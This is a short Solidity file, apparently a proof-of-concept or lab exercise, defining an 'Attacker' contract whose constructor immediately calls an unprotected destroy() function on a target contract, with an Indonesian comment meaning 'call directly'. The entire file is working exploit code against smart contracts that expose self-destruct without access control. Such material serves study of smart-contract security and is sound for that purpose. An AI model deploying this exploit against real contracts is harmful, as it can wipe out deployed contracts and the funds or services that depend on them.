// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

interface IVuln {
    function destroy() external;
}

contract Attacker {
    constructor(address _target) {
        IVuln(_target).destroy(); // panggil langsung
    }
}
